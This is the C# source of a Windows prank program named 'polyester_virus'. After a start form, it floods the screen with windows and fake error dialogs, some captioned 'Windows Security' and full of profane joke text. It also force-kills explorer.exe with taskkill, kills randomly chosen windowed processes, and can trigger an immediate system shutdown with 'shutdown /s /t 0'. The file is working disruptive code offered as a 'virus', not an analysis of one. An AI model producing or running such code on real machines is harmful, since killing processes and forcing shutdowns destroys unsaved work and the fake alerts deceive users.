using LibVLCSharp.Shared;
using polyester_virus.Windows;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace polyester_virus
{
    internal static class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        public static LibVLC libVLC { get; private set; } = new();

        readonly static string[] messages =
        {
            "CRITICAL (FUCK): Reality integrity check failed.\n\nUnknown process detected inside the simulation",
            "FATAL EXCEPTION 0xDEAD6767\n\nThe system has become concerned",
            "WARNING: Too many windows detected\n\nRecommended action to take a shit",
            "CRITICAL SYSTEM ERROR\n\nSlop population has exceeded recommended levels",
            "SECURITY ALERT\n\nAn unauthorized amount of shit has been detected.",
            "FATAL ERROR\n\nThe computer has run out of fucks to give",
            "WARNING: This is probably fine actually",
            "SYSTEM FAILURE\n\nError: Everything is going exactly as planned.",
            "CRITICAL ERROR OH SHIT\n\nPlease remain calm",
            "WARNING\n\nThe number of active polyester is no longer mathematically reasonable",
            "UNHANDLED EXCEPTION\n\nSomething went terribly wrong or sum ✌",
            "SHIT EXCEPTION\n\nWindows are moving unexpectedly",
            "SYSTEM ALERT\n\nAn unknown entity has requested permission to do sum bs",
            "严重错误\n\n检测到未知窗口。\n系统状态：非常可疑。",
            "系统警告\n\n窗口数量已超过合理范围。\n请保持冷静。",
            "خطأ حرج في النظام\n\nتم اكتشاف نافذة غير معروفة.\nحالة النظام: غير مستقرة.",
            "تحذير أمني\n\nعدد النوافذ المفتوحة تجاوز الحد المسموح به.",
            "严重警告\n\n窗口正在自行移动。\n这是正常现象……大概。",
            "إنذار النظام\n\nالنوافذ تتحرك بشكل غير متوقع.\nلا داعي للذعر.",
            "未处理异常\n\n系统不知道发生了什么。",
            "استثناء غير معالج\n\nالنظام لا يعرف ماذا حدث.",
        };

        readonly static string[] captions =
        {
            "CRITICAL SYSTEM ERROR",
            "Windows Security",
            "FATAL EXCEPTION",
            "SYSTEM WARNING",
            "SECURITY ALERT",
            "Application Error",
            "CRITICAL FAILURE",
            "إنذار أمني",
            "系统警告",
            "系统严重错误",
            "خطأ حرج",
        };

        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static async Task Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            LibVLCSharp.Shared.Core.Initialize();

            Form1 form1 = new();
            Application.Run(form1);
            if (!form1.DoVirus) return;
            form1.Dispose();

            new BackgroundBlur().Show();
            System.Windows.Forms.Timer timer = new()
            {
                Interval = 50
            };

            for (int i = 0; i < 5; i++)
            {
                Form2.Create();
            }
            timer.Tick += (_, _) =>
            {
                WindowMover.MoveWindowsRandomly();

                Form2.Create();
                if (Random.Shared.Next(3) == 1)
                {
                    CoolMessageBox.ShowNonBlocking("polyester boi (spider pih)", "ERROR", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error, 
                        true, true);
                }
                if (Random.Shared.Next(3) == 1)
                {
                    WindowMover.MoveWindowsRandomly();
                }
                if (Random.Shared.Next(4) == 1)
                {
                    new MonitoringTheSituation().Show();
                }
                if (Random.Shared.Next(4) == 1)
                {
                    string message = messages[Random.Shared.Next(messages.Length)];
                    string caption = captions[Random.Shared.Next(captions.Length)];

                    CoolMessageBox.ShowNonBlocking(
                        message,
                        caption,
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error,
                        random: true,
                        topMost: true);
                }
                if (Random.Shared.Next(10) == 1)
                {
                    new ArabicMeme().Show();
                }
                if (Random.Shared.Next(20) == 1)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c \"taskkill /im explorer.exe /f\"",
                        CreateNoWindow = false,
                        UseShellExecute = false
                    });
                }
                if (Random.Shared.Next(50) == 1)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c start explorer.exe\"",
                        CreateNoWindow = false,
                        UseShellExecute = false
                    });
                }
                if (Random.Shared.Next(40) == 1)
                {
                    KillRandomWindowProcess();
                }
                if (Random.Shared.Next(1000) == 1)
                {
                    ProcessStartInfo psi = new("shutdown", "/s /t 0")
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };
                    Process.Start(psi);
                }
            };


            SynchronizationContext uiContext = SynchronizationContext.Current!;
                
            Thread timerThread = new(() =>
            {
                Thread.Sleep(4000);
                uiContext.Post(_ =>
                {
                    timer.Start();
                }, null);
            });

            Thread exitThread = new(() =>
            {
                Thread.Sleep(20000);
                Application.Exit();
            });

            timerThread.Start();
            exitThread.Start();

            Application.Run();
        }

        static bool KillRandomWindowProcess()
        {
            IOrderedEnumerable<Process> processes = Process.GetProcesses()
                .Where(p =>
                {
                    try
                    {
                        return p.Id != Environment.ProcessId &&
                               p.MainWindowHandle != nint.Zero;
                    }
                    catch
                    {
                        return false;
                    }
                })
                .OrderBy(_ => Guid.NewGuid());

            foreach (Process? process in processes)
            {
                try
                {
                    process.Kill();
                    process.WaitForExit(2000);
                    return true;
                }
                catch (UnauthorizedAccessException)
                {
                    // Requires admin — try another process
                }
                catch (InvalidOperationException)
                {
                    // Process already exited — try another process
                }
            }

            return false;
        }
    }
}